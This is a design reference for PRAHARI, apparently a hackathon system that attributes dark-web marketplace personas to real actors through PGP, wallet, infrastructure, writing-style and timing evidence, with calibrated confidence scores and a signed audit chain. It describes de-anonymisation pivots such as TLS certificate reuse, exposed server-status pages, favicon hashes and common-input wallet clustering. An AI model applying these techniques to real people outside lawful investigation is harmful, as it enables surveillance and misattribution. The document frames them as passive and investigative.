# PRAHARI v2 — the complete reference

**PRAHARI · प्रहरी — the sentinel.** Dark-web threat-actor attribution.

Link the personas behind marketplace and forum activity into single real actors, say **how
confident** we are with a published error rate, place their infrastructure on a map that never
lets an assumption look like a measurement, and keep a record nobody can quietly edit.

Smart India Hackathon 2026 · Problem Statement **26151** (NTRO) · Team Vasiliades.
**₹0** to run, free and open source, entirely on-premise.

> **Scope of this document: v2 only.** The two halves that ship are **ATTRIBUTION** (who the
> actor is) and **SANGAM** (where their infrastructure is). The v1 Jabalpur geofence console is
> not in this tree — `isInJabalpurZone()` exists nowhere in `web/` or `engine/`, and
> `PROGRESS.md` records that the v1 console was fully removed during the rebuild. Where
> `docs/ARCHITECTURE.md` §1 still calls Stage 4 "v1 geofence, UNCHANGED", it is stale; Stage 4
> is SANGAM. v1 survives only as a separate sibling checkout and a separate deployment.

---

## Contents

1. [The idea, and the interpretation](#1-the-idea-and-the-interpretation)
2. [Architecture](#2-architecture)
3. [The data model](#3-the-data-model)
4. [Stage 0 — Collect](#4-stage-0--collect)
5. [Stage 1 — Extract](#5-stage-1--extract)
6. [Stage 2 — The four engines](#6-stage-2--the-four-engines)
7. [Stage 3 — Evidence fusion](#7-stage-3--evidence-fusion)
8. [Stage 4 — SANGAM](#8-stage-4--sangam)
9. [Stage 5 — The audit chain](#9-stage-5--the-audit-chain)
10. [Networking — live Tor timing](#10-networking--live-tor-timing)
11. [The web application](#11-the-web-application)
12. [The engine API](#12-the-engine-api)
13. [The testbed and every measured number](#13-the-testbed-and-every-measured-number)
14. [Testing, CI and invariants](#14-testing-ci-and-invariants)
15. [Running and deploying](#15-running-and-deploying)
16. [The findings ledger](#16-the-findings-ledger)
17. [What is not built](#17-what-is-not-built)
18. [Glossary](#18-glossary)

---

## 1. The idea, and the interpretation

### The idea in one breath

A threat actor wears many masks online — different handles, on different markets. But the
person behind them keeps making the same small public mistakes: the same signing key, the same
wallet, the same writing habit, the same activity rhythm. PRAHARI collects those mistakes from
**public** sources, works out which masks are the same actor, and states how sure it is.

An **actor** is the thing under investigation. A **persona** is one handle on one marketplace.
The entire system exists to decide which personas belong to the same actor, to say how
confident that is, and to show why.

### The interpretation, stated once and never walked back

> We attribute by correlating **voluntarily leaked** footprints across public sources. We never
> break Tor, never scrape a live market, never probe a target host, and never claim to.

This is not a disclaimer bolted on at the end. It is enforced in code:

- `assert_not_onion()` guards every outbound URL in the infrastructure engine.
- The SANGAM resolver refuses `.onion` **before any lookup happens**, not after.
- A **network-layer test** asserts that zero outbound requests reach a `.onion`, so the property
  is measured rather than promised.
- Measured outbound `.onion` requests: **0**.

### The three claims that make it different

**1 · A confidence score that survives cross-examination.** Naive evidence stacking treats every
signal as independent. It is not, and the consequence is not academic: five correlated signals
saturate at **0.999**, a claim of near-certainty that will not survive a defence lawyer. PRAHARI
converts each signal to a likelihood ratio, **collapses them by root cause** so one underlying
fact cannot be counted five times, and **dampens each by its measured reliability**. The same
evidence yields **0.84**.

**2 · A record nobody can quietly edit.** Every analyst action is canonically serialised,
keccak-256 hashed, chained to its predecessor and Ed25519-signed. Each case's Merkle root is
anchored on Polygon Amoy at zero gas — **32-byte hashes only, never PII**. One record verifies
against the root via its inclusion proof without disclosing the rest of the case.

**3 · Honest surfaces.** SANGAM draws a derived coordinate as a hollow dashed pin at 1-decimal
precision with no jitter, ever. The Tor demo runs a real hidden service and a real client that
we own. Every fallback is badged. **A badge that misreports which engine actually ran is a
Critical finding.**

---

## 2. Architecture

### The six stages

```
STAGE 0          STAGE 1        STAGE 2                 STAGE 3
COLLECT    ──▶   EXTRACT   ──▶  FOUR ENGINES      ──▶   EVIDENCE FUSION
public data      entities       infra · identity        LR per signal,
DNM archives     PGP/wallet     stylometry · chain      grouped by root cause,
Agora CSV        onion/city     each emits a Signal     dampened by reliability
OSINT feeds      handle/email   with a ROOT LABEL       ↓
crt.sh/Shodan                                           PairScore + trail
mempool/Etherscan                                       ↓
                                                        STAGE 4
                                                        SANGAM
                                                        host → DNS → geo-IP
                                                        resolved / derived /
                                                        unavailable
                                                        ↓
                                                        STAGE 5
                                                        WORKBENCH + AUDIT
                                                        hash chain · Ed25519
                                                        Merkle root → chain
                                                        CSV / JSON / PDF
```

### Repository layout

```
Prahari/
  web/                  Next.js 14 App Router · 132 .ts/.tsx files
    app/                routes: /, /login, /workbench/**, /command, /sangam, /docs, /about
      api/              engine proxy, admin proxy, auth, signup, step-up, health
    components/         workbench · workspace · graph · sangam · three · ui · system · command
    lib/                api · workspace · graphModel · graphExport · signals · skins
                        rbac · totp · sessions · passwords · adminGuard · ipAllowlist
                        report · reportPdf · geoderive · sangamClass · serviceStatus · buildInfo
    __tests__/          26 vitest files
    e2e/                journey.mjs + baseline screenshots
  engine/               FastAPI · Python 3.12 (uv) · 84 .py files
    engine/
      ingest/           dataset · osint · chain · kaggle_agora
      extract/          extractor · normalise
      engines/          infra · graph · linkage · stylometry · behaviour · authorship
                        verifier · chainflow · actors · loader · *_testbed
      fusion/           score · calibrate · eval
      geo/              classify · resolve                    ← SANGAM
      networking/       timing · tor_testbed
      audit/            ledger · merkle · cases · export · anchor
      admin/            auth · store
      routers/          15 routers
      testbed/          generate.py — synthetic ground truth, fixed seed
      models.py         ten SQLAlchemy tables
      settings.py       every key optional
      scheduler.py      APScheduler
      uptime.py         keep-alive budget accounting
    tests/              18 pytest files
    alembic/            migrations
  anchor/               Foundry: PrahariAnchor.sol + deploy/verify scripts
  docs/                 ARCHITECTURE · DECISIONS (1,830 lines) · METRICS · TESTLOG
                        UPGRADE_V2.1 · UPTIME · DEMO · DECK · AUDIT_V1
  scripts/              demo.sh · warmup.sh · deploy_amoy.sh · gen_docs.cjs · keepalive_*.py
  .github/workflows/    ci.yml · keepalive.yml
  docker-compose.yml    neo4j (+GDS) · postgres (+pgvector)
```

### The trust boundary

The browser **never** talks to the engine directly. Every call goes through a server-side proxy
at `/api/engine/[...path]` with a strict allowlist.

| Runs in | Holds | Must never hold |
|---|---|---|
| **Browser** | React UI, zustand stores, Leaflet, localStorage records | No API key. No engine URL. No private key. |
| **Next server** | NextAuth, the read proxy, the separate admin proxy, `NEXTAUTH_SECRET`, `PASSWORD_PEPPER`, `ENGINE_SERVICE_SECRET` | Sole path to the engine |
| **FastAPI engine** | Ingest, extract, engines, fusion, SANGAM, ledger, anchoring, `ANCHORER_KEY`, DB credentials | Not exposed to the browser |
| **Polygon Amoy** | `anchor(bytes32, bytes32, uint32)` | **32-byte hashes only** |

`ENGINE_URL` is deliberately **not** prefixed `NEXT_PUBLIC_`, so Next cannot inline it into a
client bundle. **INV-2** pins this: a test fails the build if a third reader of that variable
ever appears. It has already fired once, in Phase 7.

**The proxy allowlist.** Not a passthrough — a future engine admin route must not become
reachable from the browser by guessing:

```
health · version · sources · extract · actors · actor · export
graph · fusion · audit · infra · chain · tor · geo
feed · style · behaviour · rebrand · compare
```

**Two-attempt timeout.** Fusion and audit routes do real computation, and Render's free plan
sleeps. A measured cold start took **77 s**. One attempt cannot both fail fast on a real outage
and survive that, so the proxy makes two: the first ends at **45 s** having woken the instance,
the retry lands on a warm engine at **60 s**. Only `GET` is retried — replaying a `POST` that
seals the ledger and anchors on chain is worse than an honest timeout. A double timeout renders
as *"engine is waking — a free-tier cold start takes 30–60 s"*, never *"offline"*.

A failing upstream answers in HTML (Render's suspension page, a 502, a 504). Streaming that
HTML back made the browser's `res.json()` throw, so the workbench blamed an unreachable engine
and hid the real cause. Non-JSON responses are now only streamed through **on success**.

### The degradation contract

Nothing hard-fails. Every dependency has an honest fallback, and the UI always says which path
ran.

| Missing | Behaviour |
|---|---|
| `GROQ_API_KEY` | Local regex extractor; badge says `local` |
| Engine down | DEMO and LIVE modes fully work; DATASET shows "engine offline" |
| Engine *asleep* | **"waking"** — same vocabulary in the footer dot and the data panels |
| `SHODAN_API_KEY` | Infra runs cache-only; certspotter still carries the 0.95/0.85 rules |
| `ETHERSCAN_API_KEY` | Documented no-op, exactly like the Groq path |
| Model weights absent | Stylometry falls back to classic features; badge says so |
| Network down | Anvil chain + fixtures, **LOCAL CHAIN** badge — never a silent switch |
| Tor cannot bootstrap | Controlled replay over the same real correlation engine, badged `simulated` |
| Neo4j / Postgres down | Workbench stays up and degrades honestly |
| `ENGINE_SERVICE_SECRET` | Command Panel refuses with a 503 **naming the variable**, not a bare 500 |

The engine boots with no `.env`, with Postgres down, and with every optional key absent.
Anything it cannot do it reports through `/version` capabilities rather than failing at import,
and every disabled capability is logged **at boot** — degradation is announced, never discovered
at demo time.

---

## 3. The data model

Ten SQLAlchemy tables. Nothing speculative: every column exists because a phase named it.

| Table | Holds |
|---|---|
| `sources` | Every ingest source and its last successful scan — the basis of freshness reporting |
| `personas` | `{id, market, handle, first_seen, last_seen}` |
| `posts` | `{persona_id, market, ts, title, body, price, category, raw_pgp}` |
| `entities` | Extracted identifiers: PGP, wallet, onion, email, handle, city, contraband |
| `signals` | `{pair_id, root, name, strength, reliability, provenance, negative, cap}` |
| `pair_scores` | `{p_raw, p_calibrated, roots_used[], roots_collapsed[], negatives[], trail[]}` |
| `cases` | Investigation cases, with `actorId, personas[], confidence, sealRoot, sealTx` |
| `audit_records` | `{seq, case_id, actor, action, payload, prev_hash, hash, signature, pubkey, ts}` |
| `seals` | `{case_id, root, leaf_count, tx_hash, chain_id, block, anchored_at}` |
| `users` | Analyst accounts, roles, registered Ed25519 public keys |

`signals.root` is **constrained in the schema, not left free-text**. The six root causes are the
heart of the confidence model, and grouping by root is what stops one underlying fact being
counted five times — so the value cannot drift.

**The reproducibility contract:** every number in `PairScore` must be recomputable from `trail`
alone. A score whose trail does not reproduce it is a **Critical finding**.

---

## 4. Stage 0 — Collect

Four ingest adapters. All passive, all reading indexes that already hold the data.

### `ingest/kaggle_agora.py` — the real marketplace corpus

The Kaggle *Dark Net Marketplace Data (Agora 2014–2015)* CSV: publicly released, academically
archived. **We read a file; we never touch Tor and never scrape anything live.**

| Measured property | Value |
|---|---|
| Rows | **109,689** |
| Rows skipped as malformed | **0** |
| Vendors / personas extracted | **3,192** |
| Columns | `Vendor, Category, Item, Item Description, Price, Origin, Destination, Rating, Remarks` |
| **Timestamp column** | **None exists** |

That last row drives a whole design decision (DEC-018): because Agora carries no timestamps,
`Post.ts` is left `None` and **every temporal feature runs on the testbed instead**. Stated
openly rather than papered over with a fabricated date.

**The content rule.** Category-level fields only. `Item Description` is passed through a
blocklist and dropped when it looks like synthesis or how-to instruction:

- Listing bodies dropped: **1,832 (1.67%)**
- The listing itself is **retained** — that a vendor offered a category is exactly what we
  analyse; the instructions are what we refuse to store or render.

### `ingest/dataset.py` — DATASET-mode feed

Real Agora listings shaped as v1-style `Intercept` records, loaded once from a **committed
fixture** so the demo never depends on the 32 MB download. Entities are extracted per listing,
so the workbench shows real identifiers pulled from real marketplace text.

Severity here is **not** a geofence verdict. Agora contains no Madhya Pradesh geography at all,
so a DATASET item can never breach a zone — and must never pretend to.

### `ingest/osint.py` — public OSINT

Three no-key sources (Hacker News via Algolia, Google News RSS, Reddit JSON), a 20-second cache,
and `allSettled` semantics: a source that fails is **dropped, never raised**. Legal open-source
intelligence, not dark-web scraping. Inherited contract (**INV-4**): `fetch_all()` never raises
and always returns a usable payload, even with the network down.

### `ingest/chain.py` — blockchain

Passive read-only queries against public explorers: **mempool.space** for Bitcoin (no key) and
**Etherscan** for Ethereum (free key). Etherscan degrades to a documented no-op when the key is
absent.

### Freshness

`/sources` reports seconds since each source's last successful scan, per source. The scheduler
records a heartbeat so `/sources` can state that it is **genuinely running**, not merely created.

---

## 5. Stage 1 — Extract

### `extract/extractor.py`

The Python port of v1's TypeScript extractor, extended. **Contract (INV-3): `extract()` never
raises.** Every enrichment is optional and degrades to the deterministic regex/gazetteer path,
and the returned `source` field always names **the engine that actually ran** — never the one we
hoped would.

Extracted types: PGP fingerprints (computed from real key blocks via `pgpy`), Bitcoin / Ethereum
/ Monero wallets, onion v3 addresses, emails, Telegram handles, marketplace handles, cities, and
contraband category terms.

**Two implementations exist on purpose** (DEC-011): the TypeScript one is the engine-offline
path; the Python one is the full engine. The 30 labelled sentences are run against both.

### `extract/normalise.py` — the gazetteer, and FINDING-07

This module exists because of a bug found while verifying the LLM path. On the Hinglish input:

```
"bhai jbp aur katni mein delivery ho jayegi"
```

Groq correctly returned `locations: ["jbp", "katni"]`. But `getAnyCity("jbp")` resolved nothing,
and `registerCities()` skipped any name it could not resolve — so **the model identified an
in-zone city and the geofence never saw it. A silently dropped breach.**

The local regex extractor did not have that bug, because it only ever emits exact gazetteer
names. It also never detects `"jbp"` at all. **Neither path was correct.**

| Property | Value |
|---|---|
| Aliases loaded | **43** |
| Region terms explicitly refused (`MP`, `India`, …) | **6** |

**Why matching is exact-alias with no fuzzy fallback.** A fabricated city manufactures a
breach that never happened, and for a police tool that is strictly worse than missing one.
`"kanti"` sits one transposition from `"Katni"` and must not match; any fuzzy matcher loose
enough to catch `"jabalpr"` catches that too. Both directions are pinned by tests —
`test_never_invents_a_city` and `test_known_limit_unseen_typos_are_missed`.

---

## 6. Stage 2 — The four engines

Each engine emits `Signal` objects carrying a **root label** — the reason they agree — rather
than a bare score. That label is what makes root-cause collapse possible downstream.

### 6.1 Infrastructure — `engines/infra.py`

Passive onion → clearnet pivoting. The whole engine rests on one rule, and it is not a
guideline:

> **We never connect to a hidden service, and never scan a host we do not own.**

Every source is a third-party index that already holds the data. Certificate Transparency logs
are published by CAs. Shodan InternetDB is a scan someone else already ran. **Reading an index
is not probing a target.** That distinction is the difference between "we correlate footprints
operators leaked themselves" and "we hack people", and it is enforced by `assert_not_onion()` on
every outbound URL plus a network-layer test — not by anyone remembering to be careful.

| Rule | Strength | Fired on testbed |
|---|---|---|
| Certificate SHA-256 reused on clearnet | **0.95** | yes |
| Exposed `server-status` names a vhost | **0.90** | yes |
| CN/SAN names a clearnet domain | **0.85** | yes |
| Favicon mmh3 hash match | **0.75** | yes |
| JARM + banner match | 0.60 | **refused** against hosts we do not control (DEC-028) |
| Banner alone | **0.40** | yes — on the decoy host |

**Strengths aggregate by `max`, never a sum.** The decoy host shares only an nginx banner and
scores 0.40: *same stack is not same operator.*

**Live source status when measured:** certspotter **working** (100 certificates for
`iitb.ac.in`, promoted to primary) · Shodan InternetDB **working**, no key needed · crt.sh
**DOWN**, 0 of 5 attempts, HTTP 502, demoted to failover (DEC-027). Cache hit rate on a repeat
pivot: 0.50.

### 6.2 Identity graph — `engines/graph.py` + `engines/linkage.py`

**Neo4j with typed weighted edges.** The weights are not arbitrary — they encode how much each
relationship is worth as evidence of shared control:

| Edge | Weight | Meaning | Class |
|---|---|---|---|
| `SIGNED_WITH` | **0.95** | same PGP key | **HARD** |
| `PAID_TO` | **0.80** | same wallet address | **HARD** |
| `CONTACT` | 0.70 | same email / telegram | soft |
| `VOUCHES_FOR` | 0.30 | trust / rating link | soft |
| `MENTIONS` | 0.20 | co-mentioned entity | soft |
| `LOCATED` | — | persona → city | soft |

**Only the two HARD identifiers may form an actor**, because those are the only edges a person
cannot casually share. Every write is a `MERGE`, so loading twice yields the same graph —
idempotence is **tested, not assumed**, because the graph reload runs on a schedule.

Actors are resolved as **weakly-connected components** over hard edges; **FastRP** embeddings
are written per persona for similarity search.

**Splink on DuckDB** does candidate generation *with a defensible weight*, not the final verdict.
Its `match_probability` becomes an input to fusion. Why Splink rather than a hand-rolled scorer:
the m/u probabilities are trained with EM on labelled data and can be **printed, defended and
reproduced**. *"The model said 0.9" is not an answer in court; "shared PGP has m = 0.6531,
u = 1.70e-05, therefore a Bayes factor of 38,519" is.*

**Blocking is a recall ceiling** — a pair never blocked can never be scored — so coverage is
measured and reported (0.8868), never assumed.

### 6.3 Stylometry, behaviour and authorship

**`engines/stylometry.py`** — features, all computed on CPU with no model download required:

- TF-IDF over **character 3–5 grams** — habits below the level of word choice
- **Function-word frequencies** — the classic authorship signal; content words change with the
  product, function words do not
- Type-token ratio, mean word length
- Punctuation and formatting habits — ellipsis style, double spaces, caps
- **Hinglish markers** — romanised-Hindi token ratio, Devanagari presence, `-ji` / `bhai` /
  `bhaiya` usage

LaBSE sentence embeddings are additive when available and absent otherwise; the badge reports
which path actually ran.

> Stylometry is the **weakest** evidence PRAHARI uses, and it is treated that way: reliability
> **0.5**, half a PGP key. Writing style is imitable, and the testbed's decoy exists to prove we
> know that.

**`engines/verifier.py`** — the authorship verification model. The playbook specified a Siamese
char-CNN in PyTorch with a documented fallback to a classic-features logistic model if CPU
training exceeded 30 minutes. **That fallback was taken deliberately (DEC-023) and implemented
as a real trained model, not a stub.** It learns weights over the pairwise feature vector rather
than using the hand-picked 0.5/0.5 blend, and its output is still only `s_style`, which fusion
dampens at 0.5.

**`engines/behaviour.py`** — when someone posts, not what they write. A vendor can rewrite their
listings; changing the hours they are awake is a lifestyle change. `temporal` is its own root
rather than folded into `linguistic` because the two have genuinely **different causes**, and
collapsing them would be exactly the double-counting the confidence model exists to prevent. All
histograms are in **IST**, because the jurisdiction is Indian.

**`engines/authorship.py`** — pair scoring across style + behaviour, and rebrand detection. This
is where the testbed's two hard cases invert relative to the identity graph:

- The **decoy** scored low in linkage (no shared identifier) but scores **high** on raw style,
  because it copied its target. `mimicry_suspected` must catch it.
- The **rebrand** pair was invisible to linkage (distinct wallets) but becomes visible here, on
  style plus a death/birth gap plus wallet lineage.

### 6.4 Chain flow — `engines/chainflow.py`

Money is the one identifier that has to touch the real world eventually. Two heuristics, both
standard and both defensible in court:

**Common-input (multi-input) clustering.** If a single transaction spends from several addresses
at once, one entity controls all of them — they had to sign for all the inputs. **Union-find**
merges them into one wallet cluster. This heuristic underpins essentially every real
chain-analysis tool.

**Change-address heuristic.** A fresh address receiving the change of a spend is usually
controlled by the same entity. Applied **conservatively**, only when unambiguous, because a
wrong merge here is a wrong attribution.

Clusters are matched against public exchange and mixer tag lists. A path to a tagged off-ramp is
the real-world lead. A path through a mixer is the money-laundering signal the problem statement
names — **and it also drops the financial evidence for attribution**, because a mixer output is
shared by thousands.

Source-independent by design: it takes transactions and produces clusters. `ingest/chain.py`
feeds it real mempool.space data; `chainflow_testbed.py` feeds it labelled co-spends so
precision is measurable.

---

## 7. Stage 3 — Evidence fusion

**The number the whole project is judged on.** `engine/fusion/score.py`.

### The three steps

1. **Likelihood ratios.** `LR = s / (1 − s)`. A probability is not evidence strength; the ratio
   is.
2. **Root-cause collapse.** Signals are grouped by *why* they agree, and only the strongest
   survives per root. **Two views of one certificate are one fact.** This is the step that stops
   double-counting.
3. **Reliability dampening.** `LR_root ^ r`, where `r` reflects how much that **class** of
   evidence has earned, independent of how strong any single instance looks.

```
LR_total  = Π over roots of  LR_root ^ r_root
posterior = prior_odds × LR_total
p         = odds / (1 + odds)

prior odds = 1 : 10       — a pair that survived blocking
             1 : 10,000   — a pair that did not
```

Being proposed as a candidate is itself weak evidence, and pretending otherwise would smuggle in
the base rate. Strengths are clamped to `[1e−6, 1−1e−6]`: `s = 1.0` gives `LR = ∞` and a
posterior of exactly 1.0, which is not a probability anyone should publish.

### The six roots and their reliability

| Root | Colour | Links two personas by | `r` | Why that number |
|---|---|---|---|---|
| `identity_key` | `#e8503a` red | A reused PGP signing key | **0.9** | A signing key is close to control |
| `infra` | `#9b7fd8` violet | An onion whose TLS cert names a clearnet host | **0.8** | Shared infrastructure is hard to fake |
| `financial` | `#d9a441` amber | A shared wallet cluster | **0.7** | Wallets are reused, but also shared and mixed |
| `temporal` | `#5b9bd5` blue | Posting rhythm, Tor timing | **0.5** | Rhythm is suggestive, not probative |
| `linguistic` | `#4fa97e` green | Stylometry | **0.5** | Style is imitable — see the decoy |
| `social` | `#c98bb0` pink | Vouches, co-presence, handles | **0.5** | Vouches and handles are cheap |

These hexes live in **one module** (`web/lib/signals.ts`) as literals, mirrored into `:root` as
`--sig-*` / `--ent-*`, and exported as both hex (for the DOM) and `0xRRGGBB` (for three.js) from
the same source — so the 3D graph and its legend cannot drift apart. **No skin block may
redefine them**, asserted by a test. In the graph colour *is* the entity type; on the trail
colour *is* the signal root. Shape and label always carry the same information, so a
colour-blind or monochrome reader loses nothing (**INV-11**).

### The worked example

Inputs `s = [0.78, 0.71, 0.83, 0.69, 0.74]`, `r = [0.9, 0.7, 0.8, 0.5, 0.5]`.
Verified by direct computation and frozen as a unit test.

| Root | Signal | s | LR = s/(1−s) | r | LR^r |
|---|---|---|---|---|---|
| `identity_key` | PGP fingerprint | 0.78 | 3.5455 | 0.9 | **3.1240** |
| `financial` | shared wallet | 0.71 | 2.4483 | 0.7 | **1.8716** |
| `infra` | cert reuse | 0.83 | 4.8824 | 0.8 | **3.5555** |
| `linguistic` | writing style | 0.69 | 2.2258 | 0.5 | **1.4919** |
| `temporal` | posting rhythm | 0.74 | 2.8462 | 0.5 | **1.6871** |

```
LR_total       = 3.1240 × 1.8716 × 3.5555 × 1.4919 × 1.6871 = 52.3219
posterior odds = 0.1 × 52.3219                              =  5.2322
p              = 5.2322 / 6.2322                            =  0.839543
```

| | Value |
|---|---|
| **PRAHARI** | **0.839543 → 0.84** |
| **Naive noisy-OR** `1 − Π(1−sᵢ)` | **0.999126 → 0.999** |
| **Gap** | **0.1596** |
| Trail reproduces `p_raw` | **exactly, to 12 dp** |

*(An LR-product baseline with prior 1:1 gives 0.9963, not 0.999. The baseline is **noisy-OR**
specifically — settled as DEC-003, because otherwise the acceptance test would have failed
against the project's own documentation.)*

### Must-not-link caps

Caps **clamp** the result rather than subtracting from it, because the reason for a cap is a
*competing explanation*, not a weaker one.

| Flag | Meaning | Ceiling |
|---|---|---|
| `conflicting_pgp` | Two personas signing simultaneously with different keys on the same platform — strong evidence of two people, whatever else agrees | **0.25** |
| `mimicry_suspected` | A copied bio explains the linguistic agreement without any shared author | **0.30** |
| `analyst_reject` | An analyst who looked and said no outranks the model | **0.10** |
| `exchange_wallet` / `mixer_wallet` | Shared by thousands, so not evidence of shared control — **the financial root is dropped entirely** | drop root |

> *A weak version of a fact that isn't a fact is still not a fact.* That is why the mixer flag
> drops the root rather than downweighting it.

Everything discarded by the collapse is **named** in `roots_collapsed` — the audit trail for the
single most contestable step in the model.

### Calibration vs. the conformal guarantee — `fusion/calibrate.py`

Two different claims, and the difference matters:

- **Calibration** says *"when we output 0.84, it is right about 84% of the time."* Measured by
  Brier score and Expected Calibration Error. Isotonic regression fits the mapping from raw
  score to observed frequency.
- **Conformal prediction** says *"among links we accept at threshold τ, at most α are wrong."*
  That is a **distribution-free finite-sample guarantee**, not a hope. It assumes nothing about
  the score being well-behaved — only that the validation split is exchangeable with what comes
  next.

The second is the defensible one, and it is why PRAHARI can publish a false-merge rate at all.
*A team that shows a graph and a confidence number cannot say what happens when they are wrong.
This can.*

### `fusion/eval.py`

Builds real `Signal`s from every engine — Splink linkage, shared wallets, stylometry, behaviour,
infra — fuses them, calibrates, and computes every metric on the landing page.

```bash
uv run python -m engine.fusion.eval
```

**Idempotent by construction:** fixed seeds, deterministic splits, sorted output. Running it
twice must produce an identical diff, *because a metric that moves when nothing changed is not a
measurement.*

---

## 8. Stage 4 — SANGAM

**SANGAM · संगम — "confluence".** Attribution answers *who*. SANGAM answers *where*. It takes an
actor and places every footprint it has — markets, infrastructure hosts, wallet off-ramps — on a
world map.

Route: `/sangam` · Engine: `engine/geo/classify.py`, `engine/geo/resolve.py`,
`routers/geo.py` · Web: `lib/sangamClass.ts`, `lib/geoderive.ts`,
`components/sangam/{Sangam,SangamMap,SangamPro,SangamProMap,LeafletCanvas}.tsx`

### 8.1 The three coordinate classes

Every point on the map is **exactly one** of three classes. This distinction is the whole point
of the map.

| Class | Marker | Meaning |
|---|---|---|
| **RESOLVED** | Solid pin | `host → DNS A/AAAA → geo-IP` returned a real location |
| **DERIVED** | **Hollow pin, dashed ring** | No resolution. A stable coordinate standing for a known hosting or exchange region. **NOT a measured location** |
| **UNAVAILABLE** | **Not plotted at all** | Nothing to place. Listed with its reason |

> *"A derived point drawn like a measured one is a picture of an assumption presented as
> evidence, and an analyst who cannot tell them apart cannot use either."*

### 8.2 Four hard rules, each with a test

1. **A derived coordinate is rounded to ONE decimal place** (~11 km). Carrying six decimals
   would imply metre precision the rule does not have.
2. **No random jitter, ever.** Two hosts that genuinely share a location get two *identical*
   coordinates and are clustered by the UI. Scattering them to look prettier is fabrication.
3. **A derived coordinate is deterministic.** The same host yields the same point across runs
   and across processes, so two analysts comparing screenshots see the same map.
4. **`.onion` is never resolved (INV-1).** It is UNAVAILABLE by construction, and the reason
   says so **as a feature**, not as an error.

### 8.3 The resolution chain

Every step is recorded with a timestamp, and the detail drawer shows the whole chain:

```
host → .onion guard → clean_host → DNS A/AAAA → answers → geo-IP → coordinate
              ↓                                              ↓
        reverse DNS                                    ASN + org
```

| Property | Value |
|---|---|
| `.onion` guard | Runs **before any lookup** (INV-1, FINDING-09) |
| Disk cache TTL | **6 hours** — infrastructure moves on the scale of days, and a demo should never wait on a lookup it made an hour ago |
| Cache age | **Returned, never hidden** |
| Freshness window | **24 h** — older points render muted with an age chip. *A stale location presented as current is a false statement* |
| Batch cap | **32** hosts (unchanged from the original contract) |
| Keys required | **None** — free and keyless (INV-12) |
| Cache location | `PRAHARI_CACHE_DIR` (default `.cache/geo_hosts.json`) |

The disk cache exists for a specific operational reason: a 512 MB free instance must never
re-resolve in a loop, and a demo must not hammer `ipwho.is` into rate-limiting mid-presentation.

### 8.4 Derivation rules

When a host does not resolve, a **derived** coordinate is produced by a named rule, and the rule
itself is returned in `derivation_rule` so the analyst can see the reasoning:

- `host contains '<key>' → <label>` — a known hosting-provider substring maps to that provider's
  region.
- `exchange '<name>' → <region>` — a tagged exchange maps to its operating region.

If no rule applies, the point is **UNAVAILABLE**, not guessed.

### 8.5 The payload

`ClassifiedPoint` — exactly what the engine reports, and the UI **never re-derives a class of
its own**. A UI that classified independently could disagree with the payload, and then the map
and the API would be telling an analyst different things.

```ts
{ host, class, lat, lng, ip, reverse_dns, asn, asn_org,
  city, region, country, country_code, provider,
  resolver_used, ttl, resolved_at,
  reason, derivation_rule, resolution_chain[], cache_age_s }
```

### 8.6 Shape, not colour

The class distinction is carried by **shape first**. Colour is skin-dependent and fails for
colour-blind readers, so shape is the primary encoding and colour is secondary. The UI also
**refuses to compare** points of different classes — comparing a measured location with a
derived one is a category error, so it is blocked rather than allowed with a caveat.

### 8.7 The SANGAM Pro surface

- **Legend** — the three classes with their marker shapes
- **Marker list** — every plotted point, class-labelled
- **Unplaced panel** — everything UNAVAILABLE, each with its reason
- **Resolution chain drawer** — the timestamped step-by-step for any host
- **Re-resolve** — force a fresh lookup, bypassing the cache
- **Host lookup box** — resolve an arbitrary host, which is also how UNAVAILABLE is demonstrated
- **Exports** — **class-preserving GeoJSON and CSV**: a derived point stays labelled derived
  after export

### 8.8 Endpoints

| Endpoint | Purpose |
|---|---|
| `GET /geo/host` | Resolve one host, full chain |
| `POST /geo/hosts` | Batch resolve, cap 32 |
| `GET /geo/asn` | ASN lookup |
| `GET /geo/actor/{actor_id}/footprint` | Every point for an actor |
| `GET /geo/certificate-links` | Certificate-derived host relationships |
| `GET /geo/sources` | Source status and freshness |

`geo/resolve.py` **extends** what `routers/geo.py` already did; it does not replace it. The
existing single-call shape and the 32-host batch cap are unchanged.

### 8.9 Two real bugs this design caught

**FINDING-06 — a fabricated fact rendered as a measurement.**
`lib/geoderive.ts` emitted a Binance off-ramp marker for **every** actor —
`Math.max(1, p.infrastructure.length)` guaranteed it — stamped `inferred: false` and captioned
as a known fact. A cash-out claim that never happened, drawn exactly like a real one. Found by a
test suite that was one hour old; pinned as a deliberately-failing test so the suite stayed green
and would flip the moment it was fixed. Closed in Phase 5. *Nothing on this map is now emitted
without evidence behind it, and nothing derived is labelled measured.*

**FINDING-09 — Critical, INV-1.**
`routers/geo.py` handed **any** host to `socket.gethostbyname()`, including a `.onion`. Proven
with a spy **before** fixing: the query really was issued. The pre-existing spy test patched a
different function and never covered the geo router at all. **Five spies** now do, including one
aimed at the original code path.

---

## 9. Stage 5 — The audit chain

The claim is narrow and testable: **nobody changed the record after the fact, and we can prove
which analyst made each decision.**

### 9.1 Three layers, each defeating a different attacker

| Layer | Mechanism | Defeats |
|---|---|---|
| **Canonical JSON** | Sorted keys, no whitespace, UTF-8, no NaN | Two systems serialising the same record to different bytes — a hash over ambiguous bytes proves nothing |
| **Hash chain** | `hash_n = keccak(prev_hash ‖ leaf_n)` | Editing record *k* breaks every hash from *k* onward, and `/audit/verify` reports the **failing index**, not just "invalid" |
| **Ed25519** | Each record signed by the analyst, key registered at signup | An attacker with **full database write access** still cannot forge a signature — the private key never touches the server |

**Threat model (attacked adversarially in D3.3):** an attacker with full DB write access, but
without the analyst's Ed25519 private key or the anchorer wallet, must not be able to alter,
delete, reorder or replay a record undetected.

### 9.2 The Merkle tree — `audit/merkle.py`

Per-case tree over sorted leaves. **An odd node is promoted, never duplicated.** Duplicating the
last node is the classic **CVE-2012-2459** shape, where two distinct leaf sets produce the same
root. Parent hashing is order-sensitive, matching Solidity byte concatenation exactly.

**Why the inclusion proof matters:** an analyst hands a court **one** record plus a short proof,
and the court verifies that record was in the sealed case **without ever seeing the other
records**, which may concern unrelated suspects. That is the practical reading of **Bharatiya
Sakshya Adhiniyam 2023 §63** — prove the integrity of the specific electronic record produced.

### 9.3 Export — `audit/export.py`

Three NTRO-mandated formats: **JSON, CSV, PDF**. Every format embeds the Merkle root, the
anchoring transaction and chain id, **plus a per-record inclusion proof** — so a single record
can be verified in isolation without disclosing the rest of the case.

### 9.4 On-chain anchoring — `audit/anchor.py` + `anchor/src/PrahariAnchor.sol`

```solidity
// Polygon Amoy, chain id 80002
